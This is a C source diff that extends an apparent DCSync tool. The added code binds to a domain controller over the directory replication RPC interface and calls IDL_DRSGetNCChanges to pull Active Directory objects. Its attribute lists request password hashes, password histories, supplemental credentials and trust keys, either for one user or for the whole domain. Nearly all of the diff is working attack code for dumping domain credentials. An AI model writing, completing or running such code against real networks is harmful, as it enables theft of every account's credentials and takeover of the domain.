@@ -1,6 +1,26 @@
+#pragma once
+
 #include "globals.h"
 #include "rpc.h"
 #include "drsr.h"
+
+LPCSTR dcsync_oids[] = {
+	szOID_ANSI_name,
+	szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
+	szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
+	szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
+	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
+	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
+	szOID_ANSI_currentValue,
+	szOID_isDeleted,
+};
+LPCSTR dcsync_oids_export[] = {
+	szOID_ANSI_name,
+	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
+	szOID_ANSI_userAccountControl,
+	szOID_ANSI_unicodePwd,
+	szOID_isDeleted,
+};
 
 BOOL getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR* fullDCName)
 {
@@ -37,16 +57,19 @@ BOOL getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO* pDomainInfo)
 	return status;
 }
 
-int dcsync()
+int dcsync(BOOL allData, LPCWSTR szUser, LPCWSTR szGuid)
 {
-	LPCWSTR szDomain = NULL, szDc = NULL, szService = NULL, szUser = NULL, szGuid = NULL;
+	LPCWSTR szDomain = NULL, szDc = NULL, szService = NULL;
 	DSNAME dsName = { 0 };
 	LPDWORD pMajor, pMinor, pBuild;
 	PPOLICY_DNS_DOMAIN_INFO pDomainInfo = NULL;
 	RPC_BINDING_HANDLE hBinding;
 	DRS_MSG_GETCHGREQ getChReq = { 0 };
+	DRS_MSG_GETCHGREPLY getChRep;
 	DRS_EXTENSIONS_INT DrsExtensionsInt;
 	DRS_HANDLE hDrs = NULL;
+	DWORD i, dwOutVersion = 0;
+	ULONG drsStatus;
 
 	getCurrentDomainInfo(&pDomainInfo);
 	szDomain = pDomainInfo->DnsDomainName.Buffer;
@@ -64,11 +87,65 @@ int dcsync()
 		PRINT_INFO(L"DS Replication Epoch is %u\n", DrsExtensionsInt.dwReplEpoch);
 
 	getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt);
+	getChReq.V8.pNC = &dsName;
+	getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
+	getChReq.V8.cMaxObjects = (allData ? 1000 : 1);
+	getChReq.V8.cMaxBytes = 0x00a00000; // 10M
+	getChReq.V8.ulExtendedOp = (allData ? 0 : EXOP_REPL_OBJ);
+	getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT*)MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData ? ARRAYSIZE(dcsync_oids_export) : ARRAYSIZE(dcsync_oids)) - 1));
+	getChReq.V8.pPartialAttrSet->dwVersion = 1;
+	getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
+	if (allData)
+	{
+		getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(dcsync_oids_export);
+		for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
+			MakeAttid(&getChReq.V8.PrefixTableDest, dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
+	}
+	else
+	{
+		getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(dcsync_oids);
+		for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
+			MakeAttid(&getChReq.V8.PrefixTableDest, dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
+	}
+
+	RpcTryExcept
+	{
+		do
+		{
+			RtlZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
+			drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
+			if (drsStatus == 0)
+			{
+				if (dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
+				{
+					PRINT_SUCCESS(L"Success in replication!");
+				}
+				else
+					PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
+				free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
+			}
+			else
+				PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);			
+		}
+		while (getChRep.V6.fMoreData);
+		IDL_DRSUnbind(&hDrs);
+	}
+	RpcExcept(RPC_EXCEPTION)
+		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+	RpcEndExcept
+
+	free_SCHEMA_PREFIX_TABLE_data(&getChReq.V8.PrefixTableDest);
+	MIDL_user_free(getChReq.V8.pPartialAttrSet);
+	deleteBinding(&hBinding);
+	LsaFreeMemory(pDomainInfo);
+
+	return 1;
 }
 
 int main(int argc, wchar_t* argv[])
 {
     
-	dcsync();
+	dcsync(TRUE, NULL, NULL);
 
 }
+
